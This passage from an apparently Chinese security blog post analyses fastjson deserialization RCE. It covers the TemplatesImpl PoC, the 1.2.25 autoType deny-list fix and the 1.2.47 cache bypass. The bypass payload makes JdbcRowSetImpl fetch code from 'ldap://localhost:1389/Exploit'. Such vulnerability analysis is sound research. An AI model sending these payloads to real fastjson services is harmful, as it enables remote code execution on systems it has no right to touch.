</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    } : <span style=color:#f1fa8c>&#34;xx&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>]
</span></span></code></pre></div><p>作为 array 里面的元素, object 的 value 都是可以的, 甚至可以作为 key, 会调用 <code>toString</code> 方法作为 JSONObject 的 key.</p><p>所以看了反序列化的流程, 那么挖掘反序列化漏洞, 可以重点看</p><ol><li>无参构造器</li><li>public 单参数 setter</li><li>返回值类型继承 Map, Collection 或者是 AtomicXxxx 的无参 getter 方法</li><li>toString</li><li>如果是手动调用的 parseObject, 那么 getter 的范围可以扩大</li></ol><h2 id=templateimpl-poc-分析>TemplateImpl POC 分析</h2><p>JdbcRowSetImpl 的 POC 比较简单, 一开始就已经分析好了. TemplateImpl 相对比较复杂, 有很多用到了 fastjson 的一些特性, 比如</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>{<span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,<span style=color:#ff79c6>&#34;_bytecodes&#34;</span>:[<span style=color:#f1fa8c>&#34;yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE....&#34;</span>],<span style=color:#ff79c6>&#34;_name&#34;</span>:<span style=color:#f1fa8c>&#34;a.b&#34;</span>,<span style=color:#ff79c6>&#34;_tfactory&#34;</span>:{ },<span style=color:#ff79c6>&#34;_outputProperties&#34;</span>:{ },<span style=color:#ff79c6>&#34;_version&#34;</span>:<span style=color:#f1fa8c>&#34;1.0&#34;</span>,<span style=color:#ff79c6>&#34;allowedProtocols&#34;</span>:<span style=color:#f1fa8c>&#34;all&#34;</span>}
</span></span></code></pre></div><p>其中 _bytecodes 是 private 的, 能赋值成功需要目标开启 Feature.SupportNonPublicField (默认关闭) 才能强制将值赋给 private 的属性. 所以这个 payload 说实话还是图一乐, 估计也就 CTF 用的到.</p><p>另外可以看到 _bytecodes 是 base64 过的, 因为 json 标准里面是不能直接序列化 binary 的, fastjson 对 byte[] 在反序列时会 base64 decode 一下.</p><p>不同与上面的 payload 的是这里触发的就不是 setter 了, 而是我们特别提到过的特殊 getter. 这里是 _outputProperties</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>synchronized</span> Properties <span style=color:#50fa7b>getOutputProperties</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>newTransformer</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getOutputProperties</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>catch</span> <span style=color:#ff79c6>(</span>TransformerConfigurationException var2<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>而 Properties 继承于 Hashtable, 最后继承到 Map. 完美符合条件, 方法里面的 <code>newTransformer</code> 最后触发 defineTransletClasses, 导致实例化 bytecode, 最后 RCE.<br>这里 _outputProperties 匹配到 getOutputProperties 这个 getter 的原因是匹配时会把 key 里面的 _ 给全部替换为空 (估计是为了方便前端 js 下划线命名可以不用特意替换成驼峰命名), 具体代码分析可以看看底下推荐阅读的 3 号.<br>所以这里 payload 可以写成 outputProperties, 这个 _ 可有可无, 而且在扫描到 _outputProperties 就已经触发, 后面的属性也是多余的&mldr; 所以这个 payload 其实等价于</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>{<span style=color:#ff79c6>&#34;@type&#34;</span>:<span style=color:#f1fa8c>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>,<span style=color:#ff79c6>&#34;_bytecodes&#34;</span>:[<span style=color:#f1fa8c>&#34;yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQE....&#34;</span>],<span style=color:#ff79c6>&#34;_name&#34;</span>:<span style=color:#f1fa8c>&#34;anything&#34;</span>,<span style=color:#ff79c6>&#34;_tfactory&#34;</span>:{ },<span style=color:#ff79c6>&#34;outputProperties&#34;</span>:{ }}
</span></span></code></pre></div><h2 id=1225-修复>1.2.25 修复</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#6272a4>//1.2.24
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#6272a4></span>Class<span style=color:#ff79c6>&lt;?&gt;</span> clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>,</span> config<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDefaultClassLoader</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#6272a4>//1.2.25
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span><span style=color:#6272a4></span>Class<span style=color:#ff79c6>&lt;?&gt;</span> clazz <span style=color:#ff79c6>=</span> config<span style=color:#ff79c6>.</span><span style=color:#50fa7b>checkAutoType</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span></code></pre></div><p>不再直接 Class.forName 了, 而是加上了不少限制</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>typeName <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#8be9fd;font-style:italic>final</span> String className <span style=color:#ff79c6>=</span> typeName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>replace</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#39;$&#39;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#39;.&#39;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>autoTypeSupport<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> denyList<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> <span style=color:#ff79c6>++</span>i<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            String deny <span style=color:#ff79c6>=</span> denyList<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>startsWith</span><span style=color:#ff79c6>(</span>deny<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>                <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;autoType is not support. &#34;</span> <span style=color:#ff79c6>+</span> typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    Class<span style=color:#ff79c6>&lt;?&gt;</span> clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClassFromMapping</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        clazz <span style=color:#ff79c6>=</span> derializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>findClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>clazz <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        <span style=color:#ff79c6>return</span> clazz<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>    <span style=color:#ff79c6>for</span> <span style=color:#ff79c6>(</span><span style=color:#8be9fd>int</span> i <span style=color:#ff79c6>=</span> 0<span style=color:#ff79c6>;</span> i <span style=color:#ff79c6>&lt;</span> acceptList<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>;</span> <span style=color:#ff79c6>++</span>i<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>        String accept <span style=color:#ff79c6>=</span> acceptList<span style=color:#ff79c6>[</span>i<span style=color:#ff79c6>];</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>.</span><span style=color:#50fa7b>startsWith</span><span style=color:#ff79c6>(</span>accept<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>            <span style=color:#ff79c6>return</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>,</span> defaultClassLoader<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>autoTypeSupport<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>        clazz <span style=color:#ff79c6>=</span> TypeUtils<span style=color:#ff79c6>.</span><span style=color:#50fa7b>loadClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>,</span> defaultClassLoader<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>首先是加了一个 Feature, 且默认关闭, 也就是说默认不支持 @type 这种反序列类的方法了. 而且就算打开了, 还有了黑名单, 直接 ban 掉了之前的那两个 payload 的类.</p><h2 id=1247-绕过>1.2.47 绕过</h2><p>在这之间也出现不少绕过, 但是需要手动开始 autoType, 可以看看推荐阅读的 4 号. 而 1.2.47 版本出现的这个绕过就比较牛逼, 不开始 autoType 这个 feature 也能打.</p><p>先看 payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>&#34;a&#34;</span>: {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;java.lang.Class&#34;</span>, 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        <span style=color:#ff79c6>&#34;val&#34;</span>: <span style=color:#f1fa8c>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    }, 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff79c6>&#34;b&#34;</span>: {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>, 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>&#34;dataSourceName&#34;</span>: <span style=color:#f1fa8c>&#34;ldap://localhost:1389/Exploit&#34;</span>, 
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>&#34;autoCommit&#34;</span>: <span style=color:#ff79c6>true</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>}
</span></span></code></pre></div><p>先看这个 <code>java.lang.Class</code>, 需要知道一点, fastjson 有很多对内置类的提前做好的反序列化器. 可以在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 的 <code>initDeserializers</code> 的方法看到. 这个方法在类构造时就会被调用, 而其中</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#6272a4>//...省略
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#6272a4></span>deserializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>boolean</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> BooleanCodec<span style=color:#ff79c6>.</span><span style=color:#50fa7b>instance</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>deserializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>Boolean<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> BooleanCodec<span style=color:#ff79c6>.</span><span style=color:#50fa7b>instance</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>deserializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> MiscCodec<span style=color:#ff79c6>.</span><span style=color:#50fa7b>instance</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>deserializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>put</span><span style=color:#ff79c6>(</span><span style=color:#8be9fd>char</span><span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> CharArrayCodec<span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span><span style=color:#6272a4>//...省略
</span></span></span></code></pre></div><p>在反序列化时会优先使用这些预定义好的反序列器, 如果不存在的话, 才会去调用 <code>createJavaBeanDeserializer</code>, 去读取目标类的 setter, getter, 属性等去反序列化.<br>而对于 Class.class, 反序列化方法是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>Object objVal<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>resolveStatus</span> <span style=color:#ff79c6>==</span> DefaultJSONParser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>TypeNameRedirect</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>resolveStatus</span> <span style=color:#ff79c6>=</span> DefaultJSONParser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>NONE</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>accept</span><span style=color:#ff79c6>(</span>JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>COMMA</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>token</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>==</span> JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>LITERAL_STRING</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(!</span><span style=color:#f1fa8c>&#34;val&#34;</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span>lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>stringVal</span><span style=color:#ff79c6>()))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;syntax error&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        lexer<span style=color:#ff79c6>.</span><span style=color:#50fa7b>nextToken</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff79c6>throw</span> <span style=color:#ff79c6>new</span> JSONException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;syntax error&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>accept</span><span style=color:#ff79c6>(</span>JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>COLON</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    objVal <span style=color:#ff79c6>=</span> parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>parse</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>accept</span><span style=color:#ff79c6>(</span>JSONToken<span style=color:#ff79c6>.</span><span style=color:#50fa7b>RBRACE</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    objVal <span style=color:#ff79c6>=</span> parser<span style=color:#ff79c6>.</span><span style=color:#50fa7b>parse</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>String strVal<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>objVal <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    strVal <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
